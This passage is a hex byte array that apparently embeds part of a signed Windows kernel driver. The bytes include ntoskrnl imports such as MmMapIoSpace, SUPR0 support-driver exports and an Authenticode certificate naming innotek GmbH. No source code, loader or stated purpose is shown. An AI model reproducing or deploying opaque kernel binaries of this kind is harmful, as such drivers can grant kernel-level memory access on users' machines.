    0x4C, 0x6F, 0x77, 0x41, 0x6C, 0x6C, 0x6F, 0x63, 0x00, 0x53, 0x55, 0x50, 0x52, 0x30, 0x4C, 0x6F,
    0x77, 0x46, 0x72, 0x65, 0x65, 0x00, 0x53, 0x55, 0x50, 0x52, 0x30, 0x4D, 0x65, 0x6D, 0x41, 0x6C,
    0x6C, 0x6F, 0x63, 0x00, 0x53, 0x55, 0x50, 0x52, 0x30, 0x4D, 0x65, 0x6D, 0x46, 0x72, 0x65, 0x65,
    0x00, 0x53, 0x55, 0x50, 0x52, 0x30, 0x4D, 0x65, 0x6D, 0x47, 0x65, 0x74, 0x50, 0x68, 0x79, 0x73,
    0x00, 0x53, 0x55, 0x50, 0x52, 0x30, 0x4F, 0x62, 0x6A, 0x41, 0x64, 0x64, 0x52, 0x65, 0x66, 0x00,
    0x53, 0x55, 0x50, 0x52, 0x30, 0x4F, 0x62, 0x6A, 0x52, 0x65, 0x67, 0x69, 0x73, 0x74, 0x65, 0x72,
    0x00, 0x53, 0x55, 0x50, 0x52, 0x30, 0x4F, 0x62, 0x6A, 0x52, 0x65, 0x6C, 0x65, 0x61, 0x73, 0x65,
    0x00, 0x53, 0x55, 0x50, 0x52, 0x30, 0x4F, 0x62, 0x6A, 0x56, 0x65, 0x72, 0x69, 0x66, 0x79, 0x41,
    0x63, 0x63, 0x65, 0x73, 0x73, 0x00, 0x53, 0x55, 0x50, 0x52, 0x30, 0x50, 0x61, 0x67, 0x65, 0x41,
    0x6C, 0x6C, 0x6F, 0x63, 0x00, 0x53, 0x55, 0x50, 0x52, 0x30, 0x50, 0x61, 0x67, 0x65, 0x46, 0x72,
    0x65, 0x65, 0x00, 0x53, 0x55, 0x50, 0x52, 0x30, 0x55, 0x6E, 0x6C, 0x6F, 0x63, 0x6B, 0x4D, 0x65,
    0x6D, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0xA8, 0xE7, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xB6, 0xEB, 0x00, 0x00,
    0xA0, 0x88, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x50, 0xE9, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x66, 0xE9, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x72, 0xE9, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x86, 0xE9, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xA0, 0xE9, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0xAC, 0xE9, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xC8, 0xE9, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0xE0, 0xE9, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xF0, 0xE9, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x04, 0xEA, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x1C, 0xEA, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x3C, 0xEA, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x52, 0xEA, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x62, 0xEA, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x7A, 0xEA, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x8C, 0xEA, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xA4, 0xEA, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0xBE, 0xEA, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xD4, 0xEA, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0xE6, 0xEA, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xFC, 0xEA, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x14, 0xEB, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x2E, 0xEB, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x4A, 0xEB, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x5A, 0xEB, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x78, 0xEB, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x90, 0xEB, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0xA2, 0xEB, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xAC, 0xEB, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0xC4, 0xEB, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xDC, 0xEB, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0xF2, 0xEB, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x06, 0xEC, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x1E, 0xEC, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x38, 0xEC, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x4C, 0xEC, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x6A, 0xEC, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x7E, 0xEC, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x92, 0xEC, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0xA0, 0xEC, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xB0, 0xEC, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0xC8, 0xEC, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xDE, 0xEC, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0xF4, 0xEC, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x06, 0xED, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x16, 0xED, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x2C, 0xED, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x46, 0xED, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x62, 0xED, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x7A, 0xED, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x92, 0xED, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0xA8, 0xED, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0xF6, 0x01, 0x49, 0x6F, 0x66, 0x43, 0x6F, 0x6D, 0x70, 0x6C, 0x65, 0x74, 0x65, 0x52, 0x65, 0x71,
    0x75, 0x65, 0x73, 0x74, 0x00, 0x00, 0x31, 0x00, 0x44, 0x62, 0x67, 0x50, 0x72, 0x69, 0x6E, 0x74,
    0x00, 0x00, 0x92, 0x01, 0x49, 0x6F, 0x49, 0x73, 0x33, 0x32, 0x62, 0x69, 0x74, 0x50, 0x72, 0x6F,
    0x63, 0x65, 0x73, 0x73, 0x00, 0x00, 0xBB, 0x02, 0x4D, 0x6D, 0x46, 0x72, 0x65, 0x65, 0x43, 0x6F,
    0x6E, 0x74, 0x69, 0x67, 0x75, 0x6F, 0x75, 0x73, 0x4D, 0x65, 0x6D, 0x6F, 0x72, 0x79, 0x00, 0x00,
    0x72, 0x01, 0x49, 0x6F, 0x46, 0x72, 0x65, 0x65, 0x4D, 0x64, 0x6C, 0x00, 0xC2, 0x02, 0x4D, 0x6D,
    0x47, 0x65, 0x74, 0x53, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x52, 0x6F, 0x75, 0x74, 0x69, 0x6E, 0x65,
    0x41, 0x64, 0x64, 0x72, 0x65, 0x73, 0x73, 0x00, 0x3E, 0x04, 0x52, 0x74, 0x6C, 0x49, 0x6E, 0x69,
    0x74, 0x55, 0x6E, 0x69, 0x63, 0x6F, 0x64, 0x65, 0x53, 0x74, 0x72, 0x69, 0x6E, 0x67, 0x00, 0x00,
    0x14, 0x02, 0x4B, 0x65, 0x43, 0x61, 0x6E, 0x63, 0x65, 0x6C, 0x54, 0x69, 0x6D, 0x65, 0x72, 0x00,
    0x3D, 0x02, 0x4B, 0x65, 0x49, 0x6E, 0x73, 0x65, 0x72, 0x74, 0x51, 0x75, 0x65, 0x75, 0x65, 0x44,
    0x70, 0x63, 0x00, 0x00, 0x96, 0x05, 0x5F, 0x5F, 0x43, 0x5F, 0x73, 0x70, 0x65, 0x63, 0x69, 0x66,
    0x69, 0x63, 0x5F, 0x68, 0x61, 0x6E, 0x64, 0x6C, 0x65, 0x72, 0x00, 0x00, 0xD2, 0x02, 0x4D, 0x6D,
    0x4D, 0x61, 0x70, 0x4C, 0x6F, 0x63, 0x6B, 0x65, 0x64, 0x50, 0x61, 0x67, 0x65, 0x73, 0x53, 0x70,
    0x65, 0x63, 0x69, 0x66, 0x79, 0x43, 0x61, 0x63, 0x68, 0x65, 0x00, 0x00, 0xEF, 0x02, 0x4D, 0x6D,
    0x55, 0x6E, 0x6D, 0x61, 0x70, 0x4C, 0x6F, 0x63, 0x6B, 0x65, 0x64, 0x50, 0x61, 0x67, 0x65, 0x73,
    0x00, 0x00, 0x84, 0x02, 0x4B, 0x65, 0x53, 0x65, 0x74, 0x54, 0x69, 0x6D, 0x65, 0x72, 0x45, 0x78,
    0x00, 0x00, 0x8C, 0x00, 0x45, 0x78, 0x53, 0x65, 0x74, 0x54, 0x69, 0x6D, 0x65, 0x72, 0x52, 0x65,
    0x73, 0x6F, 0x6C, 0x75, 0x74, 0x69, 0x6F, 0x6E, 0x00, 0x00, 0x5F, 0x01, 0x49, 0x6F, 0x44, 0x65,
    0x6C, 0x65, 0x74, 0x65, 0x44, 0x65, 0x76, 0x69, 0x63, 0x65, 0x00, 0x00, 0x61, 0x01, 0x49, 0x6F,
    0x44, 0x65, 0x6C, 0x65, 0x74, 0x65, 0x53, 0x79, 0x6D, 0x62, 0x6F, 0x6C, 0x69, 0x63, 0x4C, 0x69,
    0x6E, 0x6B, 0x00, 0x00, 0x81, 0x02, 0x4B, 0x65, 0x53, 0x65, 0x74, 0x54, 0x61, 0x72, 0x67, 0x65,
    0x74, 0x50, 0x72, 0x6F, 0x63, 0x65, 0x73, 0x73, 0x6F, 0x72, 0x44, 0x70, 0x63, 0x00, 0x7C, 0x02,
    0x4B, 0x65, 0x53, 0x65, 0x74, 0x49, 0x6D, 0x70, 0x6F, 0x72, 0x74, 0x61, 0x6E, 0x63, 0x65, 0x44,
    0x70, 0x63, 0x00, 0x00, 0x2D, 0x02, 0x4B, 0x65, 0x49, 0x6E, 0x69, 0x74, 0x69, 0x61, 0x6C, 0x69,
    0x7A, 0x65, 0x44, 0x70, 0x63, 0x00, 0x37, 0x02, 0x4B, 0x65, 0x49, 0x6E, 0x69, 0x74, 0x69, 0x61,
    0x6C, 0x69, 0x7A, 0x65, 0x54, 0x69, 0x6D, 0x65, 0x72, 0x45, 0x78, 0x00, 0xC0, 0x02, 0x4D, 0x6D,
    0x47, 0x65, 0x74, 0x50, 0x68, 0x79, 0x73, 0x69, 0x63, 0x61, 0x6C, 0x41, 0x64, 0x64, 0x72, 0x65,
    0x73, 0x73, 0x00, 0x00, 0x4A, 0x02, 0x4B, 0x65, 0x51, 0x75, 0x65, 0x72, 0x79, 0x41, 0x63, 0x74,
    0x69, 0x76, 0x65, 0x50, 0x72, 0x6F, 0x63, 0x65, 0x73, 0x73, 0x6F, 0x72, 0x73, 0x00, 0xB2, 0x02,
    0x4D, 0x6D, 0x42, 0x75, 0x69, 0x6C, 0x64, 0x4D, 0x64, 0x6C, 0x46, 0x6F, 0x72, 0x4E, 0x6F, 0x6E,
    0x50, 0x61, 0x67, 0x65, 0x64, 0x50, 0x6F, 0x6F, 0x6C, 0x00, 0x33, 0x01, 0x49, 0x6F, 0x41, 0x6C,
    0x6C, 0x6F, 0x63, 0x61, 0x74, 0x65, 0x4D, 0x64, 0x6C, 0x00, 0xAC, 0x02, 0x4D, 0x6D, 0x41, 0x6C,
    0x6C, 0x6F, 0x63, 0x61, 0x74, 0x65, 0x43, 0x6F, 0x6E, 0x74, 0x69, 0x67, 0x75, 0x6F, 0x75, 0x73,
    0x4D, 0x65, 0x6D, 0x6F, 0x72, 0x79, 0x00, 0x00, 0x55, 0x01, 0x49, 0x6F, 0x43, 0x72, 0x65, 0x61,
    0x74, 0x65, 0x53, 0x79, 0x6D, 0x62, 0x6F, 0x6C, 0x69, 0x63, 0x4C, 0x69, 0x6E, 0x6B, 0x00, 0x00,
    0x4C, 0x01, 0x49, 0x6F, 0x43, 0x72, 0x65, 0x61, 0x74, 0x65, 0x44, 0x65, 0x76, 0x69, 0x63, 0x65,
    0x00, 0x00, 0xBB, 0x05, 0x6D, 0x65, 0x6D, 0x63, 0x68, 0x72, 0x00, 0x00, 0xCA, 0x05, 0x73, 0x74,
    0x72, 0x6E, 0x63, 0x6D, 0x70, 0x00, 0x6E, 0x74, 0x6F, 0x73, 0x6B, 0x72, 0x6E, 0x6C, 0x2E, 0x65,
    0x78, 0x65, 0x00, 0x00, 0x75, 0x03, 0x50, 0x73, 0x47, 0x65, 0x74, 0x43, 0x75, 0x72, 0x72, 0x65,
    0x6E, 0x74, 0x50, 0x72, 0x6F, 0x63, 0x65, 0x73, 0x73, 0x49, 0x64, 0x00, 0x79, 0x01, 0x49, 0x6F,
    0x47, 0x65, 0x74, 0x43, 0x75, 0x72, 0x72, 0x65, 0x6E, 0x74, 0x50, 0x72, 0x6F, 0x63, 0x65, 0x73,
    0x73, 0x00, 0x58, 0x00, 0x45, 0x78, 0x46, 0x72, 0x65, 0x65, 0x50, 0x6F, 0x6F, 0x6C, 0x57, 0x69,
    0x74, 0x68, 0x54, 0x61, 0x67, 0x00, 0x46, 0x00, 0x45, 0x78, 0x41, 0x6C, 0x6C, 0x6F, 0x63, 0x61,
    0x74, 0x65, 0x50, 0x6F, 0x6F, 0x6C, 0x57, 0x69, 0x74, 0x68, 0x54, 0x61, 0x67, 0x00, 0x18, 0x02,
    0x4B, 0x65, 0x44, 0x65, 0x6C, 0x61, 0x79, 0x45, 0x78, 0x65, 0x63, 0x75, 0x74, 0x69, 0x6F, 0x6E,
    0x54, 0x68, 0x72, 0x65, 0x61, 0x64, 0x00, 0x00, 0x95, 0x05, 0x5A, 0x77, 0x59, 0x69, 0x65, 0x6C,
    0x64, 0x45, 0x78, 0x65, 0x63, 0x75, 0x74, 0x69, 0x6F, 0x6E, 0x00, 0x00, 0x0C, 0x02, 0x4B, 0x65,
    0x41, 0x63, 0x71, 0x75, 0x69, 0x72, 0x65, 0x53, 0x70, 0x69, 0x6E, 0x4C, 0x6F, 0x63, 0x6B, 0x52,
    0x61, 0x69, 0x73, 0x65, 0x54, 0x6F, 0x44, 0x70, 0x63, 0x00, 0x65, 0x02, 0x4B, 0x65, 0x52, 0x65,
    0x6C, 0x65, 0x61, 0x73, 0x65, 0x53, 0x70, 0x69, 0x6E, 0x4C, 0x6F, 0x63, 0x6B, 0x00, 0x2E, 0x02,
    0x4B, 0x65, 0x49, 0x6E, 0x69, 0x74, 0x69, 0x61, 0x6C, 0x69, 0x7A, 0x65, 0x45, 0x76, 0x65, 0x6E,
    0x74, 0x00, 0x79, 0x02, 0x4B, 0x65, 0x53, 0x65, 0x74, 0x45, 0x76, 0x65, 0x6E, 0x74, 0x00, 0x00,
    0x6F, 0x02, 0x4B, 0x65, 0x52, 0x65, 0x73, 0x65, 0x74, 0x45, 0x76, 0x65, 0x6E, 0x74, 0x00, 0x00,
    0x95, 0x02, 0x4B, 0x65, 0x57, 0x61, 0x69, 0x74, 0x46, 0x6F, 0x72, 0x53, 0x69, 0x6E, 0x67, 0x6C,
    0x65, 0x4F, 0x62, 0x6A, 0x65, 0x63, 0x74, 0x00, 0x37, 0x00, 0x45, 0x78, 0x41, 0x63, 0x71, 0x75,
    0x69, 0x72, 0x65, 0x46, 0x61, 0x73, 0x74, 0x4D, 0x75, 0x74, 0x65, 0x78, 0x00, 0x00, 0x7E, 0x00,
    0x45, 0x78, 0x52, 0x65, 0x6C, 0x65, 0x61, 0x73, 0x65, 0x46, 0x61, 0x73, 0x74, 0x4D, 0x75, 0x74,
    0x65, 0x78, 0x00, 0x00, 0xEE, 0x02, 0x4D, 0x6D, 0x55, 0x6E, 0x6D, 0x61, 0x70, 0x49, 0x6F, 0x53,
    0x70, 0x61, 0x63, 0x65, 0x00, 0x00, 0xED, 0x02, 0x4D, 0x6D, 0x55, 0x6E, 0x6C, 0x6F, 0x63, 0x6B,
    0x50, 0x61, 0x67, 0x65, 0x73, 0x00, 0xBF, 0x02, 0x4D, 0x6D, 0x46, 0x72, 0x65, 0x65, 0x50, 0x61,
    0x67, 0x65, 0x73, 0x46, 0x72, 0x6F, 0x6D, 0x4D, 0x64, 0x6C, 0x00, 0x00, 0xF5, 0x02, 0x4D, 0x6D,
    0x55, 0x6E, 0x73, 0x65, 0x63, 0x75, 0x72, 0x65, 0x56, 0x69, 0x72, 0x74, 0x75, 0x61, 0x6C, 0x4D,
    0x65, 0x6D, 0x6F, 0x72, 0x79, 0x00, 0xE1, 0x02, 0x4D, 0x6D, 0x50, 0x72, 0x6F, 0x74, 0x65, 0x63,
    0x74, 0x4D, 0x64, 0x6C, 0x53, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x41, 0x64, 0x64, 0x72, 0x65, 0x73,
    0x73, 0x00, 0xB0, 0x02, 0x4D, 0x6D, 0x41, 0x6C, 0x6C, 0x6F, 0x63, 0x61, 0x74, 0x65, 0x50, 0x61,
    0x67, 0x65, 0x73, 0x46, 0x6F, 0x72, 0x4D, 0x64, 0x6C, 0x00, 0xE6, 0x02, 0x4D, 0x6D, 0x53, 0x65,
    0x63, 0x75, 0x72, 0x65, 0x56, 0x69, 0x72, 0x74, 0x75, 0x61, 0x6C, 0x4D, 0x65, 0x6D, 0x6F, 0x72,
    0x79, 0x00, 0xDE, 0x02, 0x4D, 0x6D, 0x50, 0x72, 0x6F, 0x62, 0x65, 0x41, 0x6E, 0x64, 0x4C, 0x6F,
    0x63, 0x6B, 0x50, 0x61, 0x67, 0x65, 0x73, 0x00, 0xD0, 0x02, 0x4D, 0x6D, 0x4D, 0x61, 0x70, 0x49,
    0x6F, 0x53, 0x70, 0x61, 0x63, 0x65, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0xB0, 0x00, 0x00, 0xB0, 0x00, 0x00, 0x00, 0x20, 0xA3, 0x48, 0xA3, 0x70, 0xA3, 0x98, 0xA3,
    0xC0, 0xA3, 0xE8, 0xA3, 0x10, 0xA4, 0x38, 0xA4, 0x60, 0xA4, 0x88, 0xA4, 0xB0, 0xA4, 0xD8, 0xA4,
    0x00, 0xA5, 0x28, 0xA5, 0x50, 0xA5, 0x78, 0xA5, 0xA0, 0xA5, 0xC8, 0xA5, 0xF0, 0xA5, 0x18, 0xA6,
    0x40, 0xA6, 0x68, 0xA6, 0x90, 0xA6, 0xB8, 0xA6, 0xE0, 0xA6, 0x08, 0xA7, 0x30, 0xA7, 0x58, 0xA7,
    0x80, 0xA7, 0xA8, 0xA7, 0xD0, 0xA7, 0xF8, 0xA7, 0x20, 0xA8, 0x48, 0xA8, 0x70, 0xA8, 0x98, 0xA8,
    0xC0, 0xA8, 0xE8, 0xA8, 0x10, 0xA9, 0x38, 0xA9, 0x60, 0xA9, 0x88, 0xA9, 0xB0, 0xA9, 0xD8, 0xA9,
    0x00, 0xAA, 0x28, 0xAA, 0x50, 0xAA, 0x78, 0xAA, 0xA0, 0xAA, 0xC8, 0xAA, 0xF0, 0xAA, 0x18, 0xAB,
    0x40, 0xAB, 0x68, 0xAB, 0x90, 0xAB, 0xB8, 0xAB, 0xE0, 0xAB, 0x08, 0xAC, 0x30, 0xAC, 0x58, 0xAC,
    0x80, 0xAC, 0xA8, 0xAC, 0xD0, 0xAC, 0xF8, 0xAC, 0x20, 0xAD, 0x48, 0xAD, 0x70, 0xAD, 0x98, 0xAD,
    0xC0, 0xAD, 0xE8, 0xAD, 0x10, 0xAE, 0x38, 0xAE, 0x60, 0xAE, 0x88, 0xAE, 0xB0, 0xAE, 0xD8, 0xAE,
    0x00, 0xAF, 0x28, 0xAF, 0x50, 0xAF, 0x78, 0xAF, 0xA0, 0xAF, 0xC8, 0xAF, 0xF0, 0xAF, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0xC0, 0x1B, 0x00, 0x00, 0x00, 0x02, 0x02, 0x00, 0x30, 0x82, 0x1B, 0xB1, 0x06, 0x09, 0x2A, 0x86,
    0x48, 0x86, 0xF7, 0x0D, 0x01, 0x07, 0x02, 0xA0, 0x82, 0x1B, 0xA2, 0x30, 0x82, 0x1B, 0x9E, 0x02,
    0x01, 0x01, 0x31, 0x0B, 0x30, 0x09, 0x06, 0x05, 0x2B, 0x0E, 0x03, 0x02, 0x1A, 0x05, 0x00, 0x30,
    0x68, 0x06, 0x0A, 0x2B, 0x06, 0x01, 0x04, 0x01, 0x82, 0x37, 0x02, 0x01, 0x04, 0xA0, 0x5A, 0x30,
    0x58, 0x30, 0x33, 0x06, 0x0A, 0x2B, 0x06, 0x01, 0x04, 0x01, 0x82, 0x37, 0x02, 0x01, 0x0F, 0x30,
    0x25, 0x03, 0x01, 0x00, 0xA0, 0x20, 0xA2, 0x1E, 0x80, 0x1C, 0x00, 0x3C, 0x00, 0x3C, 0x00, 0x3C,
    0x00, 0x4F, 0x00, 0x62, 0x00, 0x73, 0x00, 0x6F, 0x00, 0x6C, 0x00, 0x65, 0x00, 0x74, 0x00, 0x65,
    0x00, 0x3E, 0x00, 0x3E, 0x00, 0x3E, 0x30, 0x21, 0x30, 0x09, 0x06, 0x05, 0x2B, 0x0E, 0x03, 0x02,
    0x1A, 0x05, 0x00, 0x04, 0x14, 0xC5, 0x4F, 0xE3, 0x1F, 0xF5, 0xC3, 0xCF, 0xE1, 0x93, 0x7B, 0x7B,
    0x09, 0x06, 0x88, 0x2A, 0x17, 0x86, 0xF4, 0x53, 0xB6, 0xA0, 0x82, 0x18, 0x2E, 0x30, 0x82, 0x03,
    0x41, 0x30, 0x82, 0x02, 0x29, 0xA0, 0x03, 0x02, 0x01, 0x02, 0x02, 0x0B, 0x01, 0x00, 0x00, 0x00,
    0x00, 0x01, 0x17, 0x1C, 0x09, 0x26, 0x65, 0x30, 0x0D, 0x06, 0x09, 0x2A, 0x86, 0x48, 0x86, 0xF7,
    0x0D, 0x01, 0x01, 0x05, 0x05, 0x00, 0x30, 0x63, 0x31, 0x0B, 0x30, 0x09, 0x06, 0x03, 0x55, 0x04,
    0x06, 0x13, 0x02, 0x42, 0x45, 0x31, 0x19, 0x30, 0x17, 0x06, 0x03, 0x55, 0x04, 0x0A, 0x13, 0x10,
    0x47, 0x6C, 0x6F, 0x62, 0x61, 0x6C, 0x53, 0x69, 0x67, 0x6E, 0x20, 0x6E, 0x76, 0x2D, 0x73, 0x61,
    0x31, 0x16, 0x30, 0x14, 0x06, 0x03, 0x55, 0x04, 0x0B, 0x13, 0x0D, 0x4F, 0x62, 0x6A, 0x65, 0x63,
    0x74, 0x53, 0x69, 0x67, 0x6E, 0x20, 0x43, 0x41, 0x31, 0x21, 0x30, 0x1F, 0x06, 0x03, 0x55, 0x04,
    0x03, 0x13, 0x18, 0x47, 0x6C, 0x6F, 0x62, 0x61, 0x6C, 0x53, 0x69, 0x67, 0x6E, 0x20, 0x4F, 0x62,
    0x6A, 0x65, 0x63, 0x74, 0x53, 0x69, 0x67, 0x6E, 0x20, 0x43, 0x41, 0x30, 0x1E, 0x17, 0x0D, 0x30,
    0x37, 0x31, 0x32, 0x32, 0x37, 0x31, 0x34, 0x33, 0x37, 0x31, 0x37, 0x5A, 0x17, 0x0D, 0x31, 0x30,
    0x31, 0x32, 0x32, 0x37, 0x31, 0x34, 0x33, 0x37, 0x31, 0x37, 0x5A, 0x30, 0x5B, 0x31, 0x0B, 0x30,
    0x09, 0x06, 0x03, 0x55, 0x04, 0x06, 0x13, 0x02, 0x44, 0x45, 0x31, 0x15, 0x30, 0x13, 0x06, 0x03,
    0x55, 0x04, 0x0A, 0x13, 0x0C, 0x69, 0x6E, 0x6E, 0x6F, 0x74, 0x65, 0x6B, 0x20, 0x47, 0x6D, 0x62,
    0x48, 0x31, 0x15, 0x30, 0x13, 0x06, 0x03, 0x55, 0x04, 0x03, 0x13, 0x0C, 0x69, 0x6E, 0x6E, 0x6F,
    0x74, 0x65, 0x6B, 0x20, 0x47, 0x6D, 0x62, 0x48, 0x31, 0x1E, 0x30, 0x1C, 0x06, 0x09, 0x2A, 0x86,
    0x48, 0x86, 0xF7, 0x0D, 0x01, 0x09, 0x01, 0x16, 0x0F, 0x69, 0x6E, 0x66, 0x6F, 0x40, 0x69, 0x6E,
    0x6E, 0x6F, 0x74, 0x65, 0x6B, 0x2E, 0x64, 0x65, 0x30, 0x81, 0x9F, 0x30, 0x0D, 0x06, 0x09, 0x2A,
    0x86, 0x48, 0x86, 0xF7, 0x0D, 0x01, 0x01, 0x01, 0x05, 0x00, 0x03, 0x81, 0x8D, 0x00, 0x30, 0x81,
    0x89, 0x02, 0x81, 0x81, 0x00, 0xB3, 0xA3, 0xF7, 0xAF, 0xA0, 0x47, 0xD7, 0x32, 0x97, 0xA7, 0xBB,
    0xB9, 0xAA, 0x8F, 0x8D, 0xDE, 0xC9, 0xC9, 0xE8, 0xF1, 0xA6, 0xA7, 0x0E, 0x23, 0x0A, 0x89, 0xB0,
    0xE5, 0xDA, 0x47, 0x90, 0x3B, 0x09, 0x71, 0x00, 0xA0, 0xF3, 0xFD, 0x26, 0xB1, 0x7D, 0x50, 0xFD,
    0x95, 0x28, 0x0A, 0x90, 0x0D, 0xF7, 0xD9, 0xDD, 0xD7, 0x7C, 0xCF, 0x50, 0xFB, 0xF9, 0x55, 0xC4,
    0xEB, 0x59, 0xDF, 0x0D, 0x6D, 0xD1, 0x3C, 0x6B, 0x99, 0x51, 0x17, 0xAF, 0x28, 0x04, 0xB7, 0x69,
    0x18, 0x35, 0xEF, 0xDD, 0xBB, 0xA6, 0xFB, 0x3D, 0x27, 0x15, 0xC9, 0x76, 0xF6, 0xB2, 0x3D, 0x18,
    0x3B, 0x6A, 0x05, 0x8B, 0x91, 0x2B, 0xC2, 0x7E, 0x59, 0x2B, 0x85, 0xE5, 0xFF, 0x41, 0x66, 0x5B,
    0x6B, 0x70, 0x96, 0xAB, 0x12, 0x5E, 0x8B, 0x35, 0x01, 0x6E, 0xB5, 0xE2, 0x2F, 0x3A, 0xCE, 0x8B,
    0x31, 0xC0, 0x1D, 0x7B, 0x53, 0x02, 0x03, 0x01, 0x00, 0x01, 0xA3, 0x81, 0x81, 0x30, 0x7F, 0x30,
    0x11, 0x06, 0x09, 0x60, 0x86, 0x48, 0x01, 0x86, 0xF8, 0x42, 0x01, 0x01, 0x04, 0x04, 0x03, 0x02,
    0x04, 0x10, 0x30, 0x0E, 0x06, 0x03, 0x55, 0x1D, 0x0F, 0x01, 0x01, 0xFF, 0x04, 0x04, 0x03, 0x02,
    0x04, 0xF0, 0x30, 0x1F, 0x06, 0x03, 0x55, 0x1D, 0x23, 0x04, 0x18, 0x30, 0x16, 0x80, 0x14, 0xD2,
    0x5B, 0xF3, 0x4B, 0x26, 0x4B, 0xA5, 0xB0, 0xE7, 0x5D, 0xFD, 0x56, 0x7F, 0xF6, 0xF1, 0x2E, 0x38,
    0x4E, 0x53, 0xA0, 0x30, 0x39, 0x06, 0x03, 0x55, 0x1D, 0x1F, 0x04, 0x32, 0x30, 0x30, 0x30, 0x2E,
    0xA0, 0x2C, 0xA0, 0x2A, 0x86, 0x28, 0x68, 0x74, 0x74, 0x70, 0x3A, 0x2F, 0x2F, 0x63, 0x72, 0x6C,
